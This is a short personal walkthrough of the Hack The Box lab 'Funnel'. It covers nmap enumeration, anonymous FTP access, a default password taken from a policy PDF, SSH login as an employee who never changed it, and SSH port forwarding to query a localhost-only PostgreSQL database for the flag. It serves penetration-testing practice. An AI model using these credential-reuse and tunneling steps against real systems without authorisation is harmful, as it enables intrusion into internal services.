## Lab Title: Funnel
- Date: 2025-08-06
- Duration: ~30 minutes

### Platform: HTB – Starting Point > Tier 1

### 1. Scenario Summary
- Learn FTP enumeration >> Further SSH Local Port Forwarding Tunneling >> Dynamic Tunneling >> Postgresqls

### 2. Findings
- Nmap          >> Enumeration
    - `nmap $ip -Pn -T5 --top-ports 10000`Two ports: 21,22 >> open
    - `nmap $ip -sV -Pn -A -p T:21` >> vsFTPd 3.0.3 >> `mail_backup` dir is allowed

- FTP           >> Leverage
    - Anonymous login `ftp $ip` >> then `anonymous` & `blank password`
    - Two files found on `mail_backup` dir >> `password_policy.pdf` (which includes default password: `funnel123#!#`)
    - Second file `welcome_28112022` >> includes email addresses of employees & welcome message
    - Email domain: `funnel.htb` >> employee names: `optimus, albert, andreas, christine, maria`
    - Apparently, `christine` has not changed the default password

- Exploit:
    - I know have full credentials of user with password >> I see that ssh is open
    - `ssh christine@$ip` >> logged in
    - `ss -tl` >> ss to investigate sockets >> `-t` TCP Sockets `-l` Listening sockets
    - Port: `5432` >> Postgresql

- POSTGRESQL Connection
    - After signing in via ssh >> I see that postgresql is running only on localhost
    - Then, I did local port forwarding via ssh >> from my machine now I direct my psql queries to victim machine
    - `ssh -L 15432:localhost:5432 christine@$ip`
    - `netstat -tuln` >> to confirm that my port 15432 is listening
    - After this, now I just run `psql -h localhost -p 15432 -U christine`
    - Inside >> postgresql server
        - `\l` >> to see databases
        - `\c db_name` >> to move to db
        - `\dt` >> to see tables
        - `select * from flag;` >> to get values from certain table

- SSH Tunneling:
    - `ssh -L port_local:localhost:port_target user@server` >> `-L` >> local port forward tunneling; client connects to server
    - `ssh -R [port_serveur]:localhost:[port_client] user@serveur` >> remote port forward tunneling; here server connects to client
    - `ssh -D port user@server` >> dynamic tunneling from local machine

### 3. Idea
- Start with FTP >> extract data >> go with ssh >> with full user credentials >> check postgresql >>
- Found that service is locally running on 5432 >> do then `ssh local port forwarding tunneling` from attacker machine
- Connect via tunneling, then execute `postgresql` research to get the flag
